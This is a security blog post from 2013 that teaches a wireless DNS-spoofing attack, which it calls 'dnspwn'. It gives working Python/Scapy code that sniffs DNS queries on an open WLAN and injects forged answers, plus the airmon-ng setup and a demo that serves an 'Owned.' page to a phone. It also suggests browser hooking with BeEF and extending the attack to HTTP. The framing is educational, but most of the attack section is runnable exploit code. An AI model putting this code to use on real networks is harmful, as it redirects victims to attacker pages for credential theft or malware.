<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta property="og:title" content='Wireless Attacks with Python: Part One - The "Dnspwn Attack" &#183; Jordan Wright'><meta property="og:site_name" content="Jordan Wright"><meta property="og:url" content="https://jordan-wright.com/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2013-11-15T00:00:00Z"><meta property="og:article:tag" content="wireless"><meta property="og:article:tag" content="python"><meta property="og:article:tag" content="security"><title>Wireless Attacks with Python: Part One - The "Dnspwn Attack" &#183; Jordan Wright</title><meta name=description content="Security and Programming Blog"><meta name=HandheldFriendly content="True"><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" href=https://jordan-wright.com/blog/images/favicon.ico><link rel=apple-touch-icon href=https://jordan-wright.com/blog/images/apple-touch-icon.png><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/screen.css><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/highlight.css><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/nav.css><link rel=stylesheet type=text/css href="//fonts.googleapis.com/css?family=Lora:ital,wght@0,400;0,700;1,400;1,700|Open+Sans:700,400|Inconsolata"><link href=https://jordan-wright.com/blog/index.xml rel=alternate type=application/rss+xml title="Jordan Wright"><meta name=generator content="Hugo 0.154.5"><link rel=canonical href=https://jordan-wright.com/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-44718701-1","auto"),ga("send","pageview")</script></head><body class=nav-closed><div class=nav><h3 class=nav-title>Menu</h3><a href=# class=nav-close><span class=hidden>Close</span></a><ul><li class=nav-opened role=presentation><a href=https://jordan-wright.com/>Home</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/contact/>Contact</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/projects/>Projects</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/blog/>Blog</a></li><li class=nav-opened role=presentation><a href=https://raidersec.blogspot.com>Raidersec</a></li></ul><a class="subscribe-button icon-feed" href=https://jordan-wright.com/blog/index.xml>Subscribe</a></div><span class=nav-cover></span><div class=site-wrapper><header class="main-header post-head no-cover"><nav class="main-nav clearfix"><a class=menu-button href=#><span class=burger>&#9776;</span><span class=word>Menu</span></a></nav></header><main class=content role=main><article class="post post"><header class=post-header><h1 class=post-title>Wireless Attacks with Python: Part One - The "Dnspwn Attack"</h1><small></small><section class=post-meta><time class=post-date datetime=2013-11-15T00:00:00Z>Nov 15, 2013
</time><span class="post-tag small"><a href=https://jordan-wright.com/blog/tags/wireless/>#wireless</a></span>
<span class="post-tag small"><a href=https://jordan-wright.com/blog/tags/python/>#python</a></span>
<span class="post-tag small"><a href=https://jordan-wright.com/blog/tags/security/>#security</a></span></section></header><section class=post-content><img src=/blog/images/headers/wireless_python.png alt class=pure-img><h3 id=introduction>Introduction</h3><p>A while back, I <a href=http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html>published a post</a> on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the <a href=http://www.aircrack-ng.org/>aircrack suite</a>.</p><p>So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.</p><h3 id=the-dnspwn-attack>The &ldquo;Dnspwn Attack&rdquo;</h3><p>The first attack we&rsquo;ll explore is what I call the &ldquo;dnspwn attack&rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &ldquo;<a href=http://airpwn.sourceforge.net/Airpwn.html>airpwn</a>&rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:</p><p>Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&rsquo;s credentials.</p><p>To do this, she remembers that she can sniff all requests coming to and from Bob&rsquo;s computer. She also knows that she is <em>closer</em> to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server <em>before</em> the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&rsquo;s computer will likely ignore any further traffic received, including the real response!</p><p>Let&rsquo;s see what this would look like:</p><p><a href=/blog/images/blog/wireless-attacks/dnspwn/diagram.png target=_blank><img src=/blog/images/blog/wireless-attacks/dnspwn/diagram_small.png></a></p><p>So, now that we know how the attack works, let&rsquo;s automate it!</p><h3 id=setting-up-the-alfa-awus06h>Setting up the Alfa AWUS06H</h3><p>As was the case in my Raidersec post, we will be using the handy <a href=http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8>Alfa AWUS036H</a> for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the <code>demo_insecure</code> network.</p><pre tabindex=0><code>root@bt:~# airmon-ng start wlan0
</code></pre><p>Now that we have monitor mode up and running on <code>mon0</code>, let&rsquo;s start coding!</p><h3 id=coding-the-attack>Coding the Attack</h3><p>We will utilize the <code>scapy</code> module to perform the attack. Let&rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called <code>send_response</code> that we will make later:</p><pre tabindex=0><code>from scapy.all import *

sniff(prn=lambda x: send_response(x),
	lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)
</code></pre><p>Now let&rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:</p><ul><li>802.11 Frame - Change the &ldquo;to-ds&rdquo; flag to &ldquo;from-ds&rdquo; (our request will now be coming <em>from</em> the access point)</li><li>802.11 Frame - Switch the source and destination MAC addresses</li><li>IP Layer - Switch the source and destination IP addresses</li><li>UDP layer - Switch the source and destination ports</li><li>DNS layer - Set the &ldquo;answer&rdquo; flag(s), and append our spoofed answer</li></ul><p>Fortunately, <code>scapy</code> makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are <em>4</em> MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&rsquo;s the code:</p><pre tabindex=0><code>def send_response(x):
	# Get the requested domain
	req_domain = x[DNS].qd.qname
	spoofed_ip = &#39;192.168.2.1&#39;
	# Let&#39;s build our response from a copy of the original packet
	response = x.copy()
	# We need to start by changing our response to be &#34;from-ds&#34;, or from the access point.
	response.FCfield = 2L
	# Switch the MAC addresses
	response.addr1, response.addr2 = x.addr2, x.addr1
	# Switch the IP addresses
	response.src, response.dst = x.dst, x.src
	# Switch the ports
	response.sport, response.dport = x.dport, x.sport
	# Set the DNS flags
	response[DNS].qr = 1L
	response[DNS].ra = 1L
	response[DNS].ancount = 1
</code></pre><p>Now that we&rsquo;ve set all the flags, let&rsquo;s create and append the DNS answer:</p><pre tabindex=0><code>response[DNS].an = DNSRR(
	rrname = req_domain,
	type = &#39;A&#39;,
	rclass = &#39;IN&#39;,
	ttl = 900,
	rdata = spoofed_ip
	)
</code></pre><p>And, finally, we inject the spoofed response:</p><pre tabindex=0><code>sendp(response)
</code></pre><p>That&rsquo;s all there is to it! You can find the full source on <a href=https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py>Github</a>.</p><h3 id=demo>Demo</h3><p>For the demo, I have the following HTML response available on the host 192.168.2.138:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>	Owned.
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>It&rsquo;s worth noticing that we can have <em>any</em> HTML, Javascript, etc. we want. It would be trivial to hook the browser using the <a href=http://beefproject.com/>BeEF framework</a>, for example.</p><p>Here&rsquo;s a screenshot of it in action (I am using my iPhone as the victim):</p><p><a href=/blog/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png target=_blank><img src=/blog/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png></a>
<a href=/blog/images/blog/wireless-attacks/dnspwn/iphone.png target=_blank><img src=/blog/images/blog/wireless-attacks/dnspwn/iphone_small.png></a></p><h3 id=conclusion--future-improvements>Conclusion & Future Improvements</h3><p>It&rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &ldquo;airpwn&rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:</p><ul><li>Match requests against regular expressions (for example, only replacing Javascript content)</li><li>Set options from arguments / Read configuration information from a file</li><li>Implement the attack for other protocols (ie HTTP).</li></ul><p>Enjoy!</p><p>Jordan (<a href=http://twitter.com/jw_sec>@jw_sec</a>)</p></section><footer class=post-footer><figure class=author-image><a class=img href=https://jordan-wright.com/blog/ style=background-image:url(https://jordan-wright.com/blog/images/jordan-profile.jpg)><span class=hidden>Jordan Wright's Picture</span></a></figure><section class=author><h4><a href=https://jordan-wright.com/blog/>Jordan Wright</a></h4><p>Security Researcher, Open-Source Developer.</p><div class=author-meta><span class="author-location icon-location">Texas</span></div></section><section class=share><h4>Share this post</h4><a class=share-link href="https://twitter.com/intent/tweet?text=Wireless%20Attacks%20with%20Python%3a%20Part%20One%20-%20The%20%22Dnspwn%20Attack%22&nbsp;-&nbsp;Jordan%20Wright&amp;url=https%3a%2f%2fjordan-wright.com%2fblog%2f2013%2f11%2f15%2fwireless-attacks-with-python-part-one-the-airpwn-attack%2f" onclick='return window.open(this.href,"x-share","width=550,height=235"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M18.244 2.25h3.308l-7.227 8.26 8.503 11.24h-6.68l-5.23-6.84-6.02 6.84H1.59l7.73-8.812L1.16 2.25h6.85l4.73 6.25 5.504-6.25zm-1.16 17.52h1.833L6.71 4.126H4.745L17.084 19.77z"/></svg>
<span class=hidden>X</span>
</a><a class=share-link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjordan-wright.com%2fblog%2f2013%2f11%2f15%2fwireless-attacks-with-python-part-one-the-airpwn-attack%2f&amp;t=Wireless%20Attacks%20with%20Python%3a%20Part%20One%20-%20The%20%22Dnspwn%20Attack%22" onclick='return window.open(this.href,"hn-share","width=600,height=400"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
<span class=hidden>Hacker News</span>
</a><a class=share-link href="https://www.linkedin.com/sharing/share-offsite/?url=https%3a%2f%2fjordan-wright.com%2fblog%2f2013%2f11%2f15%2fwireless-attacks-with-python-part-one-the-airpwn-attack%2f" onclick='return window.open(this.href,"linkedin-share","width=600,height=500"),!1'><svg class="share-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853.0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.6.0 4.264 2.37 4.264 5.455v6.286zM5.337 7.433a2.062 2.062.0 110-4.123 2.062 2.062.0 010 4.123zM6.814 20.452H3.861V9h2.953v11.452zM22.225.0H1.771C.792.0.0.774.0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2.0 22.222.0z"/></svg>
<span class=hidden>LinkedIn</span></a></section></footer></article></main></div><script type=text/javascript src=https://jordan-wright.com/blog/js/jquery.js></script><script type=text/javascript src=https://jordan-wright.com/blog/js/index.js></script></body></html>